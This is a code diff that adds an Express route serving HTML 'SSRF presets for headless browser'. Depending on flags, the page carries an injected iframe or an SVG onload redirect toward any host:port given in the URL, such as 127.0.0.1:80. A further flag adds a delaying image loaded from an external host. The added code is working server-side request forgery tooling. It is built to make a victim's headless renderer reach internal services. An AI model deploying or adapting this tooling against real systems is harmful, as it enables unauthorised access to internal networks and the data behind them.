@@ -41,6 +41,32 @@ app.use('/noresponse', (req, res) =>{
     console.log(JSON.stringify(req.body))
 });
 
+// html ssrf presets for headless browser /rhtml/127.0.0.1:80fsi
+// f - iframe
+// s - svg onload redirect
+// i - no response image for delay
+app.use('/rhtml/:uid', (req, res) =>{
+	let tmp = '<html><head></head><body><script></script><svg><img></body></html>';
+	const uid = req.params.uid;
+	let host = uid.split(':')[0];
+	let port = parseInt(uid.split(':')[1],10);
+	let location = `http://${host}:${port}`;
+	
+	if(uid.includes('f')){
+		tmp = tmp.replace('<script>', `<script>f=document.createElement('iframe');f.src = '${location}';document.body.appendChild(f);</script>`)
+	}
+	
+	if(uid.includes('s')){
+		tmp = tmp.replace('<svg>', `<svg/onload="location='${location}'">`)
+	}
+
+	if(uid.includes('i')){
+		tmp = tmp.replace('<svg>', '<img src="http://s.srcb.fun/noresponse">')
+	}
+	
+	res.status(200).send(tmp);
+});
+
 app.use((req, res) => {
     const rMethod = req.method;
     const rUrl = req.url;
